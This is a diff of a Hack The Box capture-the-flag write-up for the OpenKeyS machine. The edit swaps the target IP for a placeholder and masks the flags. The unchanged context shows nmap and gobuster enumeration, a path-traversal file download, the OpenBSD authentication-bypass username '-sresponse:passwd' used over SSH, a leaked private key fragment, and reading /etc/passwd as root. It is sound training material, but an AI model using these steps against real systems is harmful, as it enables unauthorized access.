@@ -11,8 +11,6 @@ htb_url: https://app.hackthebox.com/machines/OpenKeyS
 ---
 ## Overview
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/0-openkeys-infocard.png)
-
 Short description to include any strange things to be dealt with
 
 ## Useful Skills and Tools
@@ -29,11 +27,11 @@ Short description to include any strange things to be dealt with
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `10.10.10.199`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
+I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/openkeys]
-└─$ nmap -p- -sCV -n -v -oA openkeys 10.10.10.199                                                 130 ⨯
+└─$ nmap -p- -sCV -n -v -oA openkeys <YOUR_IP>                                                 130 ⨯
 Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-12 18:53 EST
 NSE: Loaded 153 scripts for scanning.
 NSE: Script Pre-scanning.
@@ -44,14 +42,14 @@ Completed NSE at 18:53, 0.00s elapsed
 Initiating NSE at 18:53
 Completed NSE at 18:53, 0.00s elapsed
 Initiating Ping Scan at 18:53
-Scanning 10.10.10.199 [2 ports]
+Scanning <YOUR_IP> [2 ports]
 Completed Ping Scan at 18:53, 0.03s elapsed (1 total hosts)
 Initiating Connect Scan at 18:53
-Scanning 10.10.10.199 [65535 ports]
-Discovered open port 22/tcp on 10.10.10.199
-Discovered open port 80/tcp on 10.10.10.199
-Increasing send delay for 10.10.10.199 from 0 to 5 due to 68 out of 225 dropped probes since last increase.
-Increasing send delay for 10.10.10.199 from 5 to 10 due to max_successful_tryno increase to 4
+Scanning <YOUR_IP> [65535 ports]
+Discovered open port 22/tcp on <YOUR_IP>
+Discovered open port 80/tcp on <YOUR_IP>
+Increasing send delay for <YOUR_IP> from 0 to 5 due to 68 out of 225 dropped probes since last increase.
+Increasing send delay for <YOUR_IP> from 5 to 10 due to max_successful_tryno increase to 4
 Connect Scan Timing: About 4.19% done; ETC: 19:06 (0:11:48 remaining)
 Connect Scan Timing: About 8.50% done; ETC: 19:05 (0:10:56 remaining)
 Connect Scan Timing: About 12.80% done; ETC: 19:05 (0:10:20 remaining)
@@ -73,16 +71,16 @@ Connect Scan Timing: About 89.63% done; ETC: 19:05 (0:01:13 remaining)
 Connect Scan Timing: About 94.69% done; ETC: 19:05 (0:00:38 remaining)
 Completed Connect Scan at 19:05, 708.43s elapsed (65535 total ports)
 Initiating Service scan at 19:05
-Scanning 2 services on 10.10.10.199
+Scanning 2 services on <YOUR_IP>
 Completed Service scan at 19:05, 6.17s elapsed (2 services on 1 host)
-NSE: Script scanning 10.10.10.199.
+NSE: Script scanning <YOUR_IP>.
 Initiating NSE at 19:05
 Completed NSE at 19:05, 2.15s elapsed
 Initiating NSE at 19:05
 Completed NSE at 19:05, 0.15s elapsed
 Initiating NSE at 19:05
 Completed NSE at 19:05, 0.00s elapsed
-Nmap scan report for 10.10.10.199
+Nmap scan report for <YOUR_IP>
 Host is up (0.042s latency).
 Not shown: 65533 closed ports
 PORT   STATE SERVICE VERSION
@@ -120,12 +118,12 @@ HTTP leads to login page
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/openkeys]
-└─$ gobuster dir -u http://10.10.10.199 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 
+└─$ gobuster dir -u http://<YOUR_IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 
 ===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
-[+] Url:            http://10.10.10.199
+[+] Url:            http://<YOUR_IP>
 [+] Threads:        10
 [+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 [+] Status codes:   200,204,301,302,307,401,403
@@ -140,7 +138,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 /css (Status: 301)
 /fonts (Status: 301)
 /vendor (Status: 301)
-[ERROR] 2020/11/12 19:20:04 [!] parse http://10.10.10.199/error_log: net/url: invalid control character in URL
+[ERROR] 2020/11/12 19:20:04 [!] parse http://<YOUR_IP>/error_log: net/url: invalid control character in URL
 ===============================================================
 2020/11/12 19:20:59 Finished
 ===============================================================
@@ -210,7 +208,7 @@ The `authenticate()` function stuck out to me since it pointed to a directory I 
 
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-check_auth.png)
 
-By navigating to the path `http://10.10.10.199/../auth_helpers/check_auth` I was able to download the `check_auth` program.  \[Ignore the fact that it looks like this is on the `/includes` page, when it loaded the file to download there was no HTML to display.\]
+By navigating to the path `http://<YOUR_IP>/../auth_helpers/check_auth` I was able to download the `check_auth` program.  \[Ignore the fact that it looks like this is on the `/includes` page, when it loaded the file to download there was no HTML to display.\]
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/openkeys]
@@ -325,15 +323,15 @@ OpenBSD, /usr/libexec/ld.so, libc.so.95.1 looked like places to start investigat
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/openkeys]
-└─$ ssh -v -F /dev/null -o PreferredAuthentications=keyboard-interactive -o KbdInteractiveDevices=bsdauth -l -sresponse:passwd 10.10.10.199
+└─$ ssh -v -F /dev/null -o PreferredAuthentications=keyboard-interactive -o KbdInteractiveDevices=bsdauth -l -sresponse:passwd <YOUR_IP>
 OpenSSH_8.3p1 Debian-1, OpenSSL 1.1.1g  21 Apr 2020
 debug1: Reading configuration data /dev/null
-debug1: Connecting to 10.10.10.199 [10.10.10.199] port 22.
+debug1: Connecting to <YOUR_IP> [<YOUR_IP>] port 22.
 debug1: Connection established.
 ...snipped...
 debug1: Remote protocol version 2.0, remote software version OpenSSH_8.1
 debug1: match: OpenSSH_8.1 pat OpenSSH* compat 0x04000000
-debug1: Authenticating to 10.10.10.199:22 as '-sresponse:passwd'
+debug1: Authenticating to <YOUR_IP>:22 as '-sresponse:passwd'
 debug1: SSH2_MSG_KEXINIT sent
 debug1: SSH2_MSG_KEXINIT received
 debug1: kex: algorithm: curve25519-sha256
@@ -342,10 +340,10 @@ debug1: kex: server->client cipher: chacha20-poly1305@openssh.com MAC: <implicit
 debug1: kex: client->server cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
 debug1: expecting SSH2_MSG_KEX_ECDH_REPLY
 debug1: Server host key: ecdsa-sha2-nistp256 SHA256:gzhq4BokiWZ1NNWrblA8w3hLOhlhoRy+NFyi2smBZOA
-The authenticity of host '10.10.10.199 (10.10.10.199)' can't be established.
+The authenticity of host '<YOUR_IP> (<YOUR_IP>)' can't be established.
 ECDSA key fingerprint is SHA256:gzhq4BokiWZ1NNWrblA8w3hLOhlhoRy+NFyi2smBZOA.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '10.10.10.199' (ECDSA) to the list of known hosts.
+Warning: Permanently added '<YOUR_IP>' (ECDSA) to the list of known hosts.
 debug1: rekey out after 134217728 blocks
 debug1: SSH2_MSG_NEWKEYS sent
 debug1: expecting SSH2_MSG_NEWKEYS
@@ -357,7 +355,7 @@ debug1: kex_input_ext_info: server-sig-algs=<ssh-ed25519,ssh-rsa,rsa-sha2-256,rs
 debug1: SSH2_MSG_SERVICE_ACCEPT received
 debug1: Authentications that can continue: publickey,password,keyboard-interactive
 debug1: Next authentication method: keyboard-interactive
-Connection closed by 10.10.10.199 port 22
+Connection closed by <YOUR_IP> port 22
 ```
 
 [https://packetstormsecurity.com/files/155572/Qualys-Security-Advisory-OpenBSD-Authentication-Bypass-Privilege-Escalation.html](https://packetstormsecurity.com/files/155572/Qualys-Security-Advisory-OpenBSD-Authentication-Bypass-Privilege-Escalation.html)
@@ -402,7 +400,6 @@ X-Powered-By: PHP/7.3.13
 Content-Length: 3093
 
 <!DOCTYPE html>
-
 
 <html><head><title>OpenKeyS - Retrieve your OpenSSH Keys</title></head><body><div><h3>OpenSSH key for user jennifer</h3><p style='font-family: monospace, monospace;'>-----BEGIN OPENSSH PRIVATE KEY-----<br />
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn<br />
@@ -452,7 +449,7 @@ It was easier to copy the key from the web browser since it didn't have the extr
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/openkeys]
-└─$ ssh jennifer@10.10.10.199 -i jennifer.key 
+└─$ ssh jennifer@<YOUR_IP> -i jennifer.key 
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 @         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@ -460,7 +457,7 @@ Permissions 0644 for 'jennifer.key' are too open.
 It is required that your private key files are NOT accessible by others.
 This private key will be ignored.
 Load key "jennifer.key": bad permissions
-jennifer@10.10.10.199's password:                                                                    
+jennifer@<YOUR_IP>'s password:                                                                    
 
 ┌──(zweilos㉿kali)-[~/htb/openkeys]
 └─$ chmod 600 jennifer.key 
@@ -470,7 +467,7 @@ Always use protection when reusing other people's keys.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/openkeys]
-└─$ ssh jennifer@10.10.10.199 -i jennifer.key
+└─$ ssh jennifer@<YOUR_IP> -i jennifer.key
 Last login: Thu Nov 12 17:47:14 2020 from 10.10.14.223
 OpenBSD 6.6 (GENERIC) #353: Sat Oct 12 10:45:56 MDT 2019
 
@@ -521,7 +518,7 @@ drwx------  2 jennifer  jennifer    512 Jan 13  2020 .ssh
 -rwxr-xr-x  1 jennifer  jennifer  14768 Nov 12 17:55 swrast_dri.so
 -rw-r-----  1 jennifer  jennifer     33 Jan 14  2020 user.txt
 openkeys$ cat user.txt                                                                                
-36ab21239a15c537bde90626891d2b10
+****
 ```
 
 `jennifer` had the user.txt flag in the user's folder
@@ -911,7 +908,7 @@ uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 
 openkeys.htb
 
 openkeys# cat /root/root.txt
-f3a553b1697050ae885e7c02dbfc6efa
+****
 
 openkeys# cat /etc/shadow
 cat: /etc/shadow: No such file or directory
@@ -987,7 +984,3 @@ jennifer:*:1001:1001:Jennifer Miller,,,:/home/jennifer:/bin/ksh
 ```
 
 There was no `/etc/shadow` file, and the passwords were not stored in `/etc/passwd`.  I will need to look up where OpenBSD stores it's password hashes at some point...
-
-Thanks to [`polarbearer`](https://app.hackthebox.eu/users/159204) & [`GibParadox`](https://app.hackthebox.eu/users/125033)for something interesting or useful about this machine.
-
-If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
